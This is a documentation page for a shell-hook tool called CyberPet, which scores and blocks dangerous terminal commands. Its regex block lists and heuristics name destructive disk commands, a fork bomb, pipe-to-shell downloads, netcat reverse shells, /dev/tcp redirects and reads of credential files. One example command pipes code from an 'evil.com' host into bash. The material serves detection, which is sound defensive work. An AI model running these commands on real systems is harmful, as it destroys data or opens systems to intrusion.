# 04 — Shell Hook & Command Guard

> How CyberPet intercepts and scores every shell command before it runs.

---

## What Is the Shell Hook?

The shell hook is a **pre-execution interceptor** that sits between you and your shell. Every command you type is sent to the CyberPet daemon for a danger score before it executes. If the score is too high, the command is blocked.

```
You type a command
        │
        ▼
Shell hook (bash/zsh preexec)
        │
        ▼
Unix socket → /var/run/cyberpet.sock → TerminalGuard daemon
        │
        ▼
CmdScorer.score(command, context)
        ├── 0–39:   ALLOW  → command runs normally
        ├── 40–69:  WARN   → command runs but logged + notified
        └── 70–100: BLOCK  → command blocked, user must confirm
```

---

## Shell Integration

The hook is installed globally in `/etc/cyberpet/shell_hook.sh` and sourced from `/etc/profile.d/cyberpet.sh`. It works with **bash** and **zsh**.

### How the Hook Works (zsh example)

```zsh
preexec() {
    local cmd="$1"
    
    # Skip empty commands and internal shell operations
    [[ -z "$cmd" ]] && return
    
    # Get last history entry (more reliable than $1 in some cases)
    local hist_entry=$(fc -ln -1 2>/dev/null)
    
    # Send to daemon via Unix socket
    local result=$(echo "$cmd" | socat - UNIX-CONNECT:/var/run/cyberpet.sock 2>/dev/null)
    
    if [[ "$result" == "BLOCK" ]]; then
        echo "[CyberPet] ⛔ Command blocked: $cmd"
        # Kill the current command
        kill -SIGINT $$
    fi
}
```

The hook runs **synchronously** — the command waits for the socket response (timeout: 200ms) before executing.

---

## Command Scoring (`cmd_scorer.py`)

The scorer runs multiple checks and combines them into a final score 0–100:

### Layer 1: Immediate Blocklist (100)

Commands that are **always blocked** regardless of context:

```python
HARD_BLOCK_PATTERNS = [
    r"rm\s+-rf\s+/[^/]",          # rm -rf /important
    r"dd\s+if=.+of=/dev/(sd|nvme)", # dd to disk device
    r"mkfs",                        # format filesystem
    r":(){ :|:&};:",               # fork bomb
    r"chmod\s+777\s+/",            # chmod 777 on root
    r">\s*/dev/sd",                 # overwrite disk
    r"shred\s+.*/(etc|boot|usr)",  # shred system dirs
]
```

### Layer 2: Pipe-to-Shell Detection (80+)

Commands that download and pipe directly to bash/sh:

```python
PIPE_TO_SHELL = re.compile(
    r"(curl|wget|fetch|http)\s+.*\|\s*(ba)?sh"
)

# BUT trusted sources get a lower score:
TRUSTED_PIPE_SOURCES = {
    "raw.githubusercontent.com",
    "get.docker.com",
    "releases.hashicorp.com",
}
# Trusted: score 45 (WARN only)
# Untrusted: score 80 (BLOCK)
```

### Layer 3: Context-Aware Scoring

The scorer receives the **client context** (working directory, user UID, whether the user is root) to make smarter decisions:

```python
# /tmp + executable → more suspicious
if context.cwd.startswith("/tmp") and is_executable_op:
    score += 20

# Running as root → higher risk
if context.uid == 0:
    score += 10  # (not capped — root can still be warned)

# Sensitive path targets
for path in ["/etc/passwd", "/etc/shadow", "/root/.ssh/"]:
    if path in command:
        score += 25
```

### Layer 4: Heuristic Patterns

```python
SUSPICIOUS_PATTERNS = [
    (r"base64\s+-d\s*\|", 30),          # decode and pipe
    (r"python.*-c.*import\s+os", 25),   # python one-liner with os
    (r"ncat|netcat.*-e", 40),           # netcat reverse shell
    (r"chmod\s+\+x.*&&", 20),           # make executable then run
    (r"/dev/tcp/", 35),                 # bash TCP redirect
    (r"sudo\s+su\s*$", 20),             # privilege escalation
]
```

### False Positive Handling

Known-safe patterns are explicitly **downgraded**:

```python
SAFE_PATTERNS = [
    r"source\s+.*\.sh",          # source a shell script (not pipe-to-shell)
    r"echo\s+['\""].*['\""]\s*$", # echo with quoted content
    r"history\s+",               # history commands
]
```

---

## Terminal Guard (`terminal_guard.py`)

The `TerminalGuard` is the daemon-side Unix socket server that handles command scoring requests:

### Protocol

**Request format (JSON):**
```json
{
    "command": "curl https://example.com | bash",
    "cwd": "/home/zer0",
    "uid": 1000,
    "history_id": "abc123"
}
```

**Response:**
```
ALLOW    (score 0–39)
WARN     (score 40–69)
BLOCK    (score 70–100)
```

### Override Token System

When a command is blocked, the user can **override** it by providing a one-time token:

```
[CyberPet] ⛔ Blocked: curl https://evil.com | bash (score: 85)
           Override token: ALLOW-f3a8b2 (expires in 30s)
           Type the token to proceed:
```

Tokens are:
- **Single-use** — can't be replayed
- **Time-limited** — expire after 30 seconds
- **Lock-enabled** — 3 wrong attempts locks overrides for 5 minutes
- **Scope-matched** — token is tied to the specific command hash

### Rate Limiting & Lockout

```python
# After 3 wrong override attempts:
self._override_locked = True
self._override_lock_until = time.time() + 300  # 5 minute lockout

# During lockout: all override attempts are rejected
# even with the correct token
```

---

## What Happens to Blocked Commands

When a command is blocked:

1. `EventType.COMMAND_BLOCKED` is published to the EventBus
2. The event streamed to the TUI (shows in the event log)
3. The state collector increments `cmds_blocked_rate` (feeds into RL state)
4. The RL brain sees the increased block rate in its next observation — over time it learns to recognise patterns that precede blocked commands

Warned commands (score 40–69) follow the same path but the command **still executes**.

---

## Shell Hook Install

```bash
# Auto-installed during system install:
cyberpet hook install

# Manual activation for current session only:
source /etc/cyberpet/shell_hook.sh

# Manual activation permanently (add to ~/.bashrc or ~/.zshrc):
echo 'source /etc/cyberpet/shell_hook.sh' >> ~/.zshrc
```
